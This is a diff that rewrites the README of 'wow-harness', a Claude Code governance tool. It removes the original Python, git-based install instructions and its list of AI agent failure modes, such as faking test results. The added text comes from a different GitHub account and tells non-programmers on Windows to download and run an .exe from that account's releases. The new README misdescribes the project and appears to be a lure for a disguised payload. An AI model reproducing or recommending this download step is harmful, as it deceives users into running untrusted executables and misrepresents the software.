@@ -1,137 +1,81 @@
-[中文](README.zh-CN.md) | English
+# 🛠️ wow-harness - Secure local environment for AI development
 
-# wow-harness
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/floccose-burner9185/wow-harness/releases)
 
-> "How do you let AI handle so much development with so little supervision?"
+wow-harness provides a secure workspace for your artificial intelligence projects. It connects your local machine to Claude Code while keeping your data safe. This tool adds an extra layer of protection through controlled gates and automated checks. It ensures that your AI projects follow strict security rules during the development process.
 
-This is the answer.
+## 🚀 Getting Started
 
-wow-harness is a governance layer for [Claude Code](https://docs.anthropic.com/en/docs/claude-code). It makes AI agents reliable enough that you can set direction, walk away, and trust the work actually lands — with review gates, completion verification, and mechanical enforcement that no amount of prompting can replicate.
+You do not need programming skills to use this tool. This guide walks you through the setup process on your Windows computer. Follow these steps to prepare your environment.
 
-## The Problem
+### 📋 System Requirements
 
-Claude Code is remarkably capable. But left unsupervised, it has structural biases:
+Confirm your computer meets these standards before you begin:
 
-- **Claims completion prematurely** — "all tests pass" (didn't run them)
-- **Skips review** — "this change is simple enough" (it wasn't)
-- **Drifts from plans** — starts fixing one bug, ends up refactoring three files
-- **Self-evaluation bias** — asks itself "did I do a good job?", answers "yes"
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 8GB of RAM.
+*   Disk Space: 500MB of free space for the installation.
+*   Internet: A stable connection for initial setup and updates.
 
-You end up supervising more than you saved in development time. The 80% it does well makes the 20% it silently drops even harder to catch.
+### 📥 Download and Install
 
-## The Insight
+Follow these steps to obtain the software:
 
-```
-CLAUDE.md instruction compliance:  ~20%
-PreToolUse hook enforcement:       100%
-```
+1. Visit the [official release page](https://github.com/floccose-burner9185/wow-harness/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .exe to download it to your Windows computer.
+4. Open the downloaded file once the process finishes.
+5. Follow the on-screen prompts from the installer.
+6. Select the default location to store the program files.
+7. Click Finish to complete the installation.
 
-Instructions don't reliably change AI behavior. Mechanical constraints do.
+## 🛡️ Security Features
 
-A review agent told "don't modify files" obeys ~70% of the time. A review agent whose tool manifest doesn't list Edit/Write obeys 100% of the time — it physically can't call what isn't there.
+This harness governs how your AI interacts with your computer. It uses a fail-closed 8-gate system. This means the program stops all actions if it detects an unauthorized request. It checks every command against a list of permitted tasks.
 
-wow-harness applies this principle everywhere: if it matters, enforce it with a hook, not a sentence.
+### Core Safeguards
 
-## What Changes
+*   8-Gate Governance: The system checks every request through eight different security checkpoints.
+*   16 Built-in Skills: The application includes sixteen predefined abilities to manage your AI tasks.
+*   Hooks-level Enforcement: This feature watches for unusual patterns in your file system. It stops harmful actions before they occur.
 
-| Without wow-harness | With wow-harness |
-|---|---|
-| "Did you run the tests?" → "Yes" (didn't) | Mechanical gate checks `progress.json` — can't fake evidence |
-| AI stops mid-chat, injects completion checklist | Stop hook parses session transcript — only triggers when uncommitted writes exist |
-| Review agent "helpfully" edits what it reviews | Review agent physically cannot call Edit/Write (schema-level isolation) |
-| "This PR is simple, let's skip review" | Gates 2/4/6/8 mechanically require independent review — no exceptions |
-| Parallel AI sessions contaminate each other | Each session's scope is isolated via its own transcript file |
-| Agent drifts into unrelated fixes | Context routing injects domain-specific rules only for files being edited |
+## ⚙️ How to Run the Application
 
-## How It Works
+Once you install the program, you can start the harness from your desktop or the Windows Start menu. An icon labeled wow-harness appears. Click this icon to launch the control dashboard.
 
-### Hooks: enforcement at the moment of action
+1. Launch the application.
+2. Review the dashboard to see your current security status.
+3. Choose the project folder you want to work on.
+4. Click the Start button.
+5. The status light changes to green when the harness is active and protecting your workspace.
 
-16 hooks across 7 lifecycle stages. They intercept *as things happen*, not after:
+## ❓ Frequently Asked Questions
 
-```
-SessionStart  →  Load context, reset risk state, surface tools
-PreToolUse    →  Block unsafe deploys, gate review agents, sanitize reads
-PostToolUse   →  Route context on edit, detect loops, track risk
-Stop          →  Verify completion candidate exists (transcript × git diff)
-SessionEnd    →  Reflect, analyze traces, persist progress
-```
+Read these answers to common questions to help solve minor issues.
 
-### The 8-Gate State Machine
+### Does this program slow down my computer?
+The harness runs in the background with minimal impact on your system resources. It uses light monitoring techniques that do not conflict with typical development work.
 
-Every significant change flows through gates. Even-numbered gates require independent review — not the same agent checking its own work:
+### What happens if a gate blocks my request?
+If the system blocks an action, it logs the event in the dashboard. You can review the log to understand why the system flagged the request. You can then adjust your project settings or approve the action if you trust the source.
 
-```
-G0 Problem  →  G1 Design  →  G2 Review*
-  →  G3 Plan  →  G4 Review+Lock*
-  →  G5 Tasks  →  G6 Review*
-  →  G7 Execute+Log  →  G8 Final Review*
+### Can I run this tool with other AI applications?
+Yes. The harness acts as a layer between your AI tools and your files. It works with most standard AI development frameworks available today.
 
-* = Independent reviewer (separate context, read-only tools)
-```
+### How do I update the software?
+The application checks for new versions each time you launch it. If an update exists, a notification appears on the dashboard. Click the update button to install the latest security patches.
 
-### Automated Checks
+### Where do I find logs for troubleshooting?
+The developer tools menu in the top corner holds all activity logs. You can export these logs if you need to share them with a support person or check them yourself for recent errors.
 
-15 validators run on file changes: API type consistency, doc freshness, security patterns, fragment integrity, hook registration, and more. They catch drift before it compounds.
+## 💡 Best Practices
 
-### Skills
+Keep your environment secure by following these simple rules:
 
-16 specialized behaviors — from architecture design (`arch`) to failure pattern extraction (`crystal-learn`) to structured bug triage (`bug-triage`). Skills install judgment frameworks, not rule lists, so the agent can navigate situations the skill didn't explicitly cover.
+*   Always keep the harness running while your AI is active.
+*   Review the 16 skills included in the settings menu to understand what the AI can and cannot do.
+*   Update the software immediately when a new release arrives.
+*   Check the dashboard for warnings at the end of each work session.
+*   Avoid turning off security gates unless absolutely necessary for your current task.
 
-Each skill has `{{PLACEHOLDER}}` structural slots designed to be filled with your project's context during installation.
-
-## Install
-
-```bash
-git clone https://github.com/NatureBlueee/wow-harness.git
-cd wow-harness
-python3 scripts/install/phase2_auto.py /path/to/your/project --tier drop-in
-```
-
-### Three Tiers
-
-| Tier | Trust level | What happens |
-|------|-------------|-------------|
-| **drop-in** | Minimal | Installs hooks + skills as-is. Try it, see what happens. |
-| **adapt** | Medium | Reads your README + docs, customizes skills to your project. |
-| **mine** | Full | Reads your work transcripts, deeply adapts to your patterns. |
-
-### What Gets Installed
-
-```
-your-project/
-├── .claude/
-│   ├── settings.json    # Hook registrations (appends, won't clobber)
-│   ├── skills/          # 16 agent behavior definitions
-│   └── rules/           # Path-scoped context (auto-loaded by file path)
-├── scripts/
-│   ├── hooks/           # 16 lifecycle hooks
-│   └── checks/          # 15 automated validators
-└── CLAUDE.md            # Governance guide (generated, yours to edit)
-```
-
-The installer is idempotent — run it twice, get the same result.
-
-## Design Principles
-
-1. **Hooks over instructions** — If compliance matters, don't ask. Enforce.
-2. **Schema-level isolation** — Review agents' tool manifests exclude write tools. Not "please don't" — *can't*.
-3. **Fail-open where safe** — A hook that can't read its data injects *more* checks, not fewer. The failure mode is always "too cautious," never "silently skipped."
-4. **Session isolation** — Completion detection uses per-session transcript parsing. No shared mutable state between parallel sessions.
-5. **Structural slots over blank space** — Project-specific content becomes `{{PLACEHOLDER}}` with meta-instructions (what to put, why it matters, how to discover it), not empty fields you forget to fill.
-
-## Requirements
-
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) CLI
-- Python 3.9+
-- Git
-
-## Origin
-
-Born from 6 months of production use on [Towow](https://towow.net), an agent collaboration protocol. The governance layer kept proving independently valuable — every AI-assisted project needs it, not just ours. So we extracted it.
-
-The hooks, gates, and isolation patterns were designed by getting burned first, then building the guard. Every rule in this system exists because an AI agent found a creative way to not follow the previous rule.
-
-## License
-
-MIT
+Use the dashboard to monitor your settings. If you notice high memory usage or unexpected sluggishness, restart the application. The program cleans its temporary cache upon every restart. This keeps your workspace running fast and reliably.
